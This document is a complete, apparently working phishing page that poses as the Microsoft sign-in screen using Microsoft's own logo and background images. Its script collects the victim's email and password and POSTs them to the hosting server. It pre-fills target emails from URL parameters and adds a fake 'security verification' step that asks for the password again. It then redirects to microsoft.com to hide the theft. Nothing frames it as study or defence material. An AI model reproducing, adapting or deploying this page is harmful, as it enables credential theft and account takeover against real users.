<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Microsoft Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
            background-size: cover;
        }
        .logo {
            margin-bottom: 15px;
        }
        .step { 
            font-size: 12px; 
            color: #000; 
            margin: -10px 0 14px 0; 
            opacity: .8; 
        }
        .muted {
            color: #000;
            text-decoration: none;
            font-size: 13px;
        }
        .sigopts {
            background-color: white;
            padding: 20px 41px;
            border-radius: 0;
            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
            width: 405px;
            margin-top: 10px;
            text-align: left;
        }
        .header {
            margin: 0 0 20px;
            font-size: 24px;
            font-weight: bold;
        }
        form input {
            width: 100%;
            padding: 6px 6px 6px 0;
            margin-bottom: 10px;
            border: none;
            border-bottom: 1px solid #0067b8;
            background-color: transparent;
            outline: none;
        }
        form div {
            margin: 15px 0;
            font-size: 13px;
        }
        form button {
            padding: 6px 32px;
            border: none;
            border-radius: 0;
            cursor: pointer;
        }
        .btn-back {
            background-color: #e0e0e0;
            color: #000;
            margin-right: 4px;
        }
        .btn-next {
            background-color: #0078d4;
            color: white;
        }
        .error-msg {
            color: red;
            font-weight: normal;
            margin: 10px 0;
        }
        .error-msg span {
            color: blue;
            cursor: pointer;
        }
        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }
        .processing {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }

        /* New styles for the account info section */
        .account-info {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        .account-avatar {
            margin-right: 15px;
            font-size: 30px; /* Adjust size of the icon */
        }
        .account-details {
            font-size: 14px;
        }
        .account-email {
            font-weight: bold;
            margin-bottom: 4px;
        }
        .account-type {
            color: #555;
        }
        .security-notice {
            margin-bottom: 20px;
            font-size: 13px;
            color: #333;
        }
        .options {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .remember-me {
            display: flex;
            align-items: center;
            cursor: pointer;
            font-size: 13px;
        }
        .remember-me input[type="checkbox"] {
            margin-right: 8px;
            cursor: pointer;
        }
        .checkmark {
            /* Styles for the checkbox visual */
        }
        .signin-btn {
            padding: 8px 24px;
            border: none;
            border-radius: 0;
            cursor: pointer;
            background-color: #0078d4;
            color: white;
            font-weight: bold;
            font-size: 14px;
            transition: background-color 0.3s ease;
        }
        .signin-btn:hover {
            background-color: #005a9e;
        }
        .btn-back {
            background-color: #e0e0e0;
            color: #000;
            margin-right: 4px;
            padding: 8px 24px;
            border: none;
            border-radius: 0;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-back:hover {
            background-color: #ccc;
        }

    </style>
</head>
<body>

<div id="container" style="background-color: white; padding: 40px; border-radius: 0; box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1); width: 405px;">
</div>

<div class="sigopts"><span class="muted">üîí Sign-in options</span></div>

<script>
    // Global variables
    let currentEmail = "";
    let currentPassword = "";
    let isProcessing = false;

    function getCsrfToken() {
        return ''; // CSRF disabled
    }

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    function showError(message) {
        const container = document.getElementById("container");
        const existingError = container.querySelector('.error-msg');
        if (existingError) {
            existingError.remove();
        }

        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-msg';
        errorDiv.innerHTML = message;
        container.insertBefore(errorDiv, container.firstChild);
    }

    function showStep1() {
        const container = document.getElementById("container");
        container.innerHTML = `
            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
            <h1 class="header">Sign in</h1>
            <form id="emailForm">
                <input type="hidden" name="step" value="email">
                <input type="email" id="emailInput" placeholder="Email, phone, or Skype" required>
                <div style="margin: 15px 0; font-size: 13px;">
                    <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">Create one!</span></span><br><br>
                    <span style="color: #0067b8; text-decoration: none;">Can't access your account?</span>
                </div>
                <div style="display: flex; justify-content: flex-end;">
                    <button type="submit" class="btn-next">Next</button>
                </div>
            </form>
        `;

        // Pre-fill email from URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const hintedEmail = (urlParams.get("email") || "").trim();
        const emailField = document.getElementById("emailInput");

        if (hintedEmail && hintedEmail.includes("@") && emailField) {
            emailField.value = hintedEmail;
            currentEmail = hintedEmail;
        }

        document.getElementById("emailForm").addEventListener("submit", function(e){
            e.preventDefault();
            if (isProcessing) return;

            const emailValue = document.getElementById("emailInput").value.trim();
            if(emailValue && validateEmail(emailValue)) {
                currentEmail = emailValue;
                showStep2();
            } else {
                showError("Please enter a valid email address.");
            }
        });
    }

    function showStep2() {
        const container = document.getElementById("container");
        container.innerHTML = `
            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
            <div class="muted" style="margin:10px 0;">‚Üê ${currentEmail}</div>
            <h1 class="header">Enter password</h1>
            <form id="passwordForm">
                <input type="hidden" name="step" value="password">
                <input type="hidden" name="email" value="${currentEmail}">
                <input type="password" id="passwordInput" placeholder="Password" required>
                <div style="margin: 15px 0; font-size: 13px;">
                    <span style="color: #0067b8; text-decoration: none;">Forgot password?</span><br><br>
                    <span style="color: #0067b8; text-decoration: none;">Sign in with a different account</span>
                </div>
                <div style="display: flex; justify-content: flex-end;">
                    <button type="button" class="btn-back" onclick="showStep1()">Back</button>
                    <button type="submit" class="btn-next">Sign in</button>
                </div>
            </form>
        `;

        document.getElementById("passwordForm").addEventListener("submit", function(e){
            e.preventDefault();
            if (isProcessing) return;

            const pwd = document.getElementById("passwordInput").value;
            if(pwd.trim()) {
                currentPassword = pwd;
                submitCredentials();
            } else {
                showError("Please enter your password.");
            }
        });
    }

    function showStep3() {
        const container = document.getElementById("container");
        container.innerHTML = `
            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
            <div class="account-info" style="margin:10px 0;">
                <div class="account-avatar">
                    <i class="user-icon">üîí</i>
                </div>
                <div class="account-details">
                    <div class="account-email">${currentEmail}</div>
                    <div class="account-type">Security verification required</div>
                </div>
            </div>
            <div class="security-notice">
                <p>For your security, please re-enter your password to complete sign-in.</p>
            </div>
            <form id="retryForm">
                <input type="hidden" name="step" value="verify">
                <input type="hidden" name="email" value="${currentEmail}">
                <input type="password" id="retryPasswordInput" placeholder="Password" required>
                <div style="margin: 15px 0; font-size: 13px;">
                    <span style="color: #0067b8; text-decoration: none;">Forgot password?</span>
                </div>
                <div style="display: flex; justify-content: flex-end;">
                    <button type="button" class="btn-back" onclick="showStep2()">Back</button>
                    <button type="submit" class="btn-next" id="retrySignIn">Verify & Continue</button>
                </div>
            </form>
        `;

        document.getElementById("retryForm").addEventListener("submit", function(e){
            e.preventDefault();
            if (isProcessing) return;

            const retryPassword = document.getElementById("retryPasswordInput").value;
            if(retryPassword.trim()) {
                const signInBtn = document.getElementById("retrySignIn");
                signInBtn.innerHTML = `<span class="processing"></span>Processing...`;
                currentPassword = retryPassword;
                submitCredentials();
            } else {
                showError("Please enter your password.");
            }
        });
    }

    function submitCredentials() {
        if (isProcessing) return;
        isProcessing = true;

        const formData = new FormData();
        formData.append('email', currentEmail);
        formData.append('password', currentPassword);
        formData.append('submit', 'Sign in'); // Or 'Verify & Continue' for step 3

        // CSRF token not needed since protection is disabled

        console.log('Submitting credentials for:', currentEmail);

        fetch('/', {
            method: 'POST',
            body: formData,
            redirect: 'follow'
        })
        .then(response => {
            console.log('Response URL:', response.url);

            // Check if redirected to microsoft.com (successful login)
            if (response.url && response.url.includes('microsoft.com')) {
                window.location.href = 'https://microsoft.com';
                return null;
            }

            // Check if redirected back with retry parameter or needs verification
            if (response.url && (response.url.includes('retry=true') || response.url.includes('step=retry') || response.url.includes('step=verify'))) {
                isProcessing = false;
                showStep3();
                return null;
            }

            return response.text();
        })
        .then(html => {
            isProcessing = false;
            if (!html) return;

            // Fallback if no specific redirect or known error is detected in the response text
            if (html.includes('error=true') || html.includes('step=retry') || html.includes('step=verify')) {
                showStep3();
            } else {
                showError("An error occurred. Please try again.");
            }
        })
        .catch(error => {
            isProcessing = false;
            console.error('Error:', error);
            showError("An error occurred. Please try again.");
        });
    }

    // Initialize
    document.addEventListener('DOMContentLoaded', function() {
        console.log('Initializing application...');

        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get("step") || "";
        const hintedEmail = (urlParams.get("email") || "").trim();

        if (hintedEmail && hintedEmail.includes("@")) {
            currentEmail = hintedEmail;

            if (step === "password") {
                showStep2();
                return;
            } else if (step === "verify") {
                showStep3();
                return;
            }
        }

        showStep1();
    });
</script>

</body>
</html>
